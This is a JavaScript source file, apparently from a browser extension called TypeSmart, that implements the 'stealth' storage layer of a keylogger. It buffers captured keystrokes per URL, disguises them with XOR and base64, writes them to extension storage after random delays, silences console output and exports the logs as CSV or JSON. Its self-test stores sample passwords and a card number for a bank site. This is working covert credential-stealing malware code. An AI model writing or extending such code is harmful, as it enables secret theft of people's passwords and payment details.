/**
 * ============================================================================
 * TypeSmart — Stealth Data Layer (data/stealth.js)
 *  — Data Management & Stealth
 * ============================================================================
 *
 * Purpose: Provides obfuscation, encoding, batching, and data export utilities.
 *          Uses in-memory buffer + random flush delay for stealth.
 *
 * Dependencies:
 *   - window.TSConstants (from shared/constants.js)
 *   - window.Schema (from shared/schema.js)
 *
 * ============================================================================
 */

/* global TSConstants, Schema */

(function (root, factory) {
  if (typeof module !== "undefined" && module.exports) {
    module.exports = factory();
  } else {
    root.Stealth = factory();
  }
})(typeof self !== "undefined" ? self : this, function () {
  "use strict";

  // CONFIGURATION

  
  var OBFUSCATION = (typeof TSConstants !== "undefined" && TSConstants.OBFUSCATION)
    ? TSConstants.OBFUSCATION 
    : { XOR_KEY: 0x5a, ENCODING: "base64" };

  var STEALTH_CONF = (typeof TSConstants !== "undefined" && TSConstants.STEALTH)
    ? TSConstants.STEALTH 
    : {
        DELAY_MS: 3000,
        BATCH_SIZE: 20,
        MIN_KEY_LENGTH: 3,
        SILENT_MODE: true,
        FLUSH_DELAY_MIN: 2000,
        FLUSH_DELAY_MAX: 5000
      };

  var STORAGE_KEY = (typeof TSConstants !== "undefined" && TSConstants.STORAGE_KEY)
    ? TSConstants.STORAGE_KEY 
    : "ts_log";

  // ===========================================================================
  // SILENT LOGGING
  // ===========================================================================
  
  var SILENT_MODE = STEALTH_CONF.SILENT_MODE === true;

  function stealthLog() {
    if (!SILENT_MODE) {
      console.log.apply(console, arguments);
    }
  }

  function stealthWarn() {
    if (!SILENT_MODE) {
      console.warn.apply(console, arguments);
    }
  }

  function stealthError() {
    console.error.apply(console, arguments);
  }


  // STORAGE DETECTION 

  
  function getStorage() {
    // Chrome
    if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
      return chrome.storage.local;
    }
    // Firefox / Browser
    if (typeof browser !== "undefined" && browser.storage && browser.storage.local) {
      return browser.storage.local;
    }
    // Mock for testing
    stealthWarn("[Stealth] Using mock storage - testing mode");
    return {
      _data: {},
      async get(key) {
        if (typeof key === "string") {
          return { [key]: this._data[key] };
        }
        var result = {};
        for (var i = 0; i < key.length; i++) {
          result[key[i]] = this._data[key[i]];
        }
        return result;
      },
      async set(items) {
        for (var key in items) {
          this._data[key] = items[key];
        }
      },
      async remove(key) {
        delete this._data[key];
      }
    };
  }

  var storage = getStorage();


  // IN-MEMORY BUFFER + RANDOM FLUSH DELAY (Stealth)

  
  var memoryBuffer = [];
  var flushTimer = null;
  var isFlushing = false;

  function getRandomFlushDelay() {
    var min = STEALTH_CONF.FLUSH_DELAY_MIN || 2000;
    var max = STEALTH_CONF.FLUSH_DELAY_MAX || 5000;
    return Math.floor(Math.random() * (max - min + 1) + min);
  }

  // Clear timer safely
  function clearFlushTimer() {
    if (flushTimer) {
      clearTimeout(flushTimer);
      flushTimer = null;
    }
  }

  async function flushBuffer() {
    // Prevent concurrent flushes
    if (isFlushing) {
      stealthLog("[Stealth] Already flushing, skipping");
      return;
    }
    
    // Nothing to flush
    if (memoryBuffer.length === 0) {
      return;
    }
    
    // Set flushing flag
    isFlushing = true;
    
    // Clear any pending timer
    clearFlushTimer();
    
    // Take a copy and clear buffer immediately
    var bufferToSave = memoryBuffer.slice();
    memoryBuffer = [];
    
    stealthLog("[Stealth] Flushing", bufferToSave.length, "entries");
    
    try {
      var result = await storage.get(STORAGE_KEY);
      var entries = result[STORAGE_KEY] || [];
      
      entries = entries.concat(bufferToSave);
      
      // Apply stealth processing
      entries = filterNoise(entries);
      entries = batchEntries(entries);
      entries = rotateOldEntries(entries, 7 * 24 * 60 * 60 * 1000);
      
      // Safety limit
      if (entries.length > 2000) {
        entries = entries.slice(-2000);
      }
      
      await storage.set({ [STORAGE_KEY]: entries });
      stealthLog("[Stealth] Successfully flushed", bufferToSave.length, "entries");
      
    } catch (e) {
      stealthError("[Stealth] Flush failed:", e);
      // Restore buffer on error (but check if new items arrived)
      memoryBuffer.unshift.apply(memoryBuffer, bufferToSave);
    } finally {
      // Always reset flushing flag
      isFlushing = false;
      
      // Schedule next flush if there are pending items
      if (memoryBuffer.length > 0 && !flushTimer) {
        flushTimer = setTimeout(flushBuffer, getRandomFlushDelay());
      }
    }
  }

  function scheduleFlush() {
    // Don't schedule if already flushing or timer exists
    if (isFlushing) {
      stealthLog("[Stealth] Skipping schedule - already flushing");
      return;
    }
    
    if (flushTimer) {
      return; // Timer already exists
    }
    
    flushTimer = setTimeout(flushBuffer, getRandomFlushDelay());
    stealthLog("[Stealth] Scheduled flush in", flushTimer._idleTimeout || getRandomFlushDelay(), "ms");
  }

  function addToBuffer(serializedEntry) {
    memoryBuffer.push(serializedEntry);
    stealthLog("[Stealth] Buffer size:", memoryBuffer.length);
    
    // Flush immediately if buffer exceeds batch size
    if (memoryBuffer.length >= (STEALTH_CONF.BATCH_SIZE || 20)) {
      stealthLog("[Stealth] Buffer size limit reached, flushing immediately");
      clearFlushTimer();
      // Call flush without await (fire and forget)
      flushBuffer().catch(function(err) {
        stealthError("[Stealth] Immediate flush failed:", err);
      });
    } else {
      scheduleFlush();
    }
  }

  // HELPER: Random delay
 
  
  function randomDelay(minMs, maxMs) {
    var delay = Math.floor(Math.random() * (maxMs - minMs + 1) + minMs);
    return new Promise(function(resolve) {
      setTimeout(resolve, delay);
    });
  }

  // HELPER: Escape CSV field
  
  function escapeCSV(field) {
    if (field === undefined || field === null) return "";
    var str = String(field);
    if (str.includes(",") || str.includes('"') || str.includes("\n")) {
      str = str.replace(/"/g, '""');
      return '"' + str + '"';
    }
    return str;
  }

  // HELPER: Validate keystroke data

  
  function isValidKeystrokeData(plainKeys) {
    if (typeof plainKeys !== "string") return false;
    if (plainKeys.length < STEALTH_CONF.MIN_KEY_LENGTH) return false;
    if (plainKeys.length > 10000) return false;
    return true;
  }

  // ===========================================================================
  // 1. obfuscate(plainText)
  // ===========================================================================
  
  function obfuscate(plainText) {
    if (typeof plainText !== "string" || plainText === "") return "";
    
    var xored = "";
    for (var i = 0; i < plainText.length; i++) {
      xored += String.fromCharCode(plainText.charCodeAt(i) ^ OBFUSCATION.XOR_KEY);
    }
    
    try {
      return btoa(xored);
    } catch (e) {
      stealthError("[Stealth] obfuscate error:", e);
      return plainText;
    }
  }

  // ===========================================================================
  // 2. deobfuscate(encoded)
  // ===========================================================================
  
  function deobfuscate(encoded) {
    if (typeof encoded !== "string" || encoded === "") return "";
    
    try {
      var decoded = atob(encoded);
      var plain = "";
      for (var i = 0; i < decoded.length; i++) {
        plain += String.fromCharCode(decoded.charCodeAt(i) ^ OBFUSCATION.XOR_KEY);
      }
      return plain;
    } catch (e) {
      stealthError("[Stealth] deobfuscate error:", e);
      return encoded;
    }
  }

  // ===========================================================================
  // 3. batchEntries(entries)
  // ===========================================================================
  
  function batchEntries(entries) {
    if (!Array.isArray(entries) || entries.length === 0) return entries || [];
    
    stealthLog("[Stealth] batchEntries called with", entries.length, "entries");
    
    var deserialized = [];
    for (var i = 0; i < entries.length; i++) {
      try {
        deserialized.push(Schema.deserializeEntry(entries[i]));
      } catch (e) {
        stealthWarn("[Stealth] Failed to deserialize entry:", e);
      }
    }
    
    if (deserialized.length === 0) return [];

    var sessions = {};
    for (var j = 0; j < deserialized.length; j++) {
      var entry = deserialized[j];
      if (!sessions[entry.sessionId]) sessions[entry.sessionId] = [];
      sessions[entry.sessionId].push(entry);
    }
    
    var merged = [];
    for (var sessionId in sessions) {
      var sessionEntries = sessions[sessionId];
      sessionEntries.sort(function(a, b) { return a.timestamp - b.timestamp; });
      
      var mergedKeys = "";
      var firstUrl = sessionEntries[0].url;
      var firstTimestamp = sessionEntries[0].timestamp;
      var isObfuscated = sessionEntries[0].obfuscated;

      for (var k = 0; k < sessionEntries.length; k++) {
        mergedKeys += sessionEntries[k].keys;
      }
      
      var mergedEntry = Schema.createEntry(firstUrl, mergedKeys, {
        sessionId: sessionId,
        obfuscated: isObfuscated
      });
      
      mergedEntry = Object.freeze({
        url: mergedEntry.url,
        timestamp: firstTimestamp,
        keys: mergedEntry.keys,
        sessionId: mergedEntry.sessionId,
        obfuscated: mergedEntry.obfuscated
      });
      
      merged.push(mergedEntry);
    }
    
    var serialized = merged.map(function(entry) {
      return Schema.serializeEntry(entry);
    });
    
    stealthLog("[Stealth] batchEntries: reduced from", entries.length, "to", serialized.length);
    return serialized;
  }

  // ===========================================================================
  // 4. exportAsCSV(entries)
  // ===========================================================================
  
  function exportAsCSV(entries) {
    if (!Array.isArray(entries)) return "url,timestamp,keys,sessionId,obfuscated\n";
    
    var csv = "url,timestamp,keys,sessionId,obfuscated\n";
    
    for (var i = 0; i < entries.length; i++) {
      try {
        var entry = Schema.deserializeEntry(entries[i]);
        var keys = entry.obfuscated ? deobfuscate(entry.keys) : entry.keys;
        
        var row = [
          escapeCSV(entry.url),
          entry.timestamp,
          escapeCSV(keys),
          escapeCSV(entry.sessionId),
          entry.obfuscated ? "true" : "false"
        ].join(",");
        
        csv += row + "\n";
        
        if (csv.length > 5000000 && i < entries.length - 1) {
          stealthWarn("[Stealth] CSV large, truncating");
          break;
        }
      } catch (e) {
        stealthWarn("[Stealth] exportAsCSV error on entry", i, e);
      }
    }
    
    return csv;
  }

  // ===========================================================================
  // 5. exportAsJSON(entries)
  // ===========================================================================
  
  function exportAsJSON(entries) {
    if (!Array.isArray(entries)) return "[]";
    
    var readable = [];
    for (var i = 0; i < entries.length; i++) {
      try {
        var entry = Schema.deserializeEntry(entries[i]);
        var keys = entry.obfuscated ? deobfuscate(entry.keys) : entry.keys;
        
        readable.push({
          url: entry.url,
          timestamp: new Date(entry.timestamp).toISOString(),
          timestampMs: entry.timestamp,
          keys: keys,
          sessionId: entry.sessionId,
          obfuscated: entry.obfuscated
        });
        
        if (readable.length > 1000) {
          stealthWarn("[Stealth] JSON limited to 1000 entries");
          break;
        }
      } catch (e) {
        stealthWarn("[Stealth] exportAsJSON error on entry", i, e);
      }
    }
    
    return JSON.stringify(readable, null, 2);
  }

  // ===========================================================================
  // 6. rotateOldEntries(entries, maxAgeMs)
  // ===========================================================================
  
  function rotateOldEntries(entries, maxAgeMs) {
    if (!Array.isArray(entries)) return [];
    if (typeof maxAgeMs !== "number" || maxAgeMs <= 0) return entries;
    
    var now = Date.now();
    var cutoff = now - maxAgeMs;
    var kept = [];
    
    for (var i = 0; i < entries.length; i++) {
      try {
        var entry = Schema.deserializeEntry(entries[i]);
        if (entry.timestamp >= cutoff) {
          kept.push(entries[i]);
        }
      } catch (e) {
        kept.push(entries[i]);
      }
    }
    
    stealthLog("[Stealth] rotateOldEntries: kept", kept.length, "entries");
    return kept;
  }

  // ===========================================================================
  // HELPER: filterNoise
  // ===========================================================================
  
  function filterNoise(entries) {
    if (!Array.isArray(entries)) return [];
    
    var minLength = STEALTH_CONF.MIN_KEY_LENGTH;
    var filtered = [];
    
    for (var i = 0; i < entries.length; i++) {
      try {
        var entry = Schema.deserializeEntry(entries[i]);
        var keys = entry.obfuscated ? deobfuscate(entry.keys) : entry.keys;
        
        if (keys.length >= minLength) {
          filtered.push(entries[i]);
        }
      } catch (e) {
        filtered.push(entries[i]);
      }
    }
    
    stealthLog("[Stealth] filterNoise: kept", filtered.length, "entries");
    return filtered;
  }

  // ===========================================================================
  // PUBLIC STORAGE FUNCTIONS
  // ===========================================================================
  
  async function storeLoggedData(url, plainKeys) {
    if (!isValidKeystrokeData(plainKeys)) return false;

    try {
      var entry = Schema.createEntry(url || "unknown", plainKeys, { obfuscated: false });
      var serialized = Schema.serializeEntry(entry);
      
      addToBuffer(serialized);
      stealthLog("[Stealth] Added to buffer:", plainKeys.length, "chars from", url);
      return true;
      
    } catch (e) {
      stealthError("[Stealth] storeLoggedData failed:", e);
      return false;
    }
  }

  async function exportData(format) {
    format = format || "json";
    
    try {
      // Wait for any ongoing flush to complete
      while (isFlushing) {
        await randomDelay(10, 50);
      }
      
      // Flush any pending data
      if (memoryBuffer.length > 0) {
        await flushBuffer();
      }
      
      var result = await storage.get(STORAGE_KEY);
      var entries = result[STORAGE_KEY] || [];
      
      if (format === "csv") {
        return exportAsCSV(entries);
      } else {
        return exportAsJSON(entries);
      }
    } catch (e) {
      stealthError("[Stealth] exportData failed:", e);
      return format === "csv" ? "" : "[]";
    }
  }

  async function clearAllData() {
    // Wait for any ongoing flush to complete
    while (isFlushing) {
      await randomDelay(10, 50);
    }
    
    // Clear buffer
    memoryBuffer = [];
    
    // Clear timer
    clearFlushTimer();
    
    try {
      await storage.remove(STORAGE_KEY);
      stealthLog("[Stealth] All logged data cleared");
      return true;
    } catch (e) {
      stealthError("[Stealth] clearAllData failed:", e);
      return false;
    }
  }

  async function getDataCount() {
    try {
      var result = await storage.get(STORAGE_KEY);
      var entries = result[STORAGE_KEY] || [];
      return entries.length + memoryBuffer.length;
    } catch (e) {
      stealthError("[Stealth] getDataCount failed:", e);
      return 0;
    }
  }

  async function forceFlush() {
    // Wait for any ongoing flush to complete
    while (isFlushing) {
      await randomDelay(10, 50);
    }
    
    await flushBuffer();
  }

  // TEST FUNCTION 

  
  async function runTest() {
    console.log("%c===  Stealth Test Started ===", "color: cyan; font-weight: bold");
    
    try {
      // Test 1: Obfuscate / Deobfuscate
      var original = "password123";
      var hidden = obfuscate(original);
      var revealed = deobfuscate(hidden);
      console.log("Test 1 - Obfuscate:", original === revealed ? "✅ PASS" : "❌ FAIL");
      console.log("  Original:", original);
      console.log("  Hidden:", hidden);
      console.log("  Revealed:", revealed);
      
      // Test 2: Clear and store
      await clearAllData();
      await storeLoggedData("https://example.com", "testpassword123");
      await storeLoggedData("https://bank.com", "card123456");
      
      // Test 3: Check count (buffer not flushed yet)
      var countBeforeFlush = await getDataCount();
      console.log("Test 2 - Before flush: Count =", countBeforeFlush, countBeforeFlush === 2 ? "✅ PASS" : "❌ FAIL");
      
      // Test 4: Force flush and verify
      await forceFlush();
      var afterFlush = await getDataCount();
      console.log("Test 3 - After flush: Count =", afterFlush, afterFlush === 2 ? "✅ PASS" : "❌ FAIL");
      
      // Test 5: Export JSON
      var json = await exportData("json");
      console.log("Test 4 - Export JSON:", json.length > 10 ? "✅ PASS" : "❌ FAIL");
      console.log("  Preview:", json.substring(0, 200) + "...");
      
      // Test 6: Export CSV
      var csv = await exportData("csv");
      console.log("Test 5 - Export CSV:", csv.length > 10 ? "✅ PASS" : "❌ FAIL");
      console.log("  First line:", csv.split("\n")[0]);
      
      // Test 7: Clear all
      await clearAllData();
      var finalCount = await getDataCount();
      console.log("Test 6 - Clear Data:", finalCount === 0 ? "✅ PASS" : "❌ FAIL");
      
    } catch (e) {
      stealthError("[Stealth] Test failed:", e);
    }
    
    console.log("%c=== Test Complete ===", "color: cyan");
  }

  // ===========================================================================
  // EXPORT SURFACE
  // ===========================================================================
  
  return Object.freeze({
    // Core functions
    obfuscate: obfuscate,
    deobfuscate: deobfuscate,
    batchEntries: batchEntries,
    exportAsCSV: exportAsCSV,
    exportAsJSON: exportAsJSON,
    rotateOldEntries: rotateOldEntries,
    filterNoise: filterNoise,
    escapeCSV: escapeCSV,
    
    // Storage functions
    storeLoggedData: storeLoggedData,
    exportData: exportData,
    clearAllData: clearAllData,
    getDataCount: getDataCount,
    forceFlush: forceFlush,
    
    // Test function
    runTest: runTest
  });
});
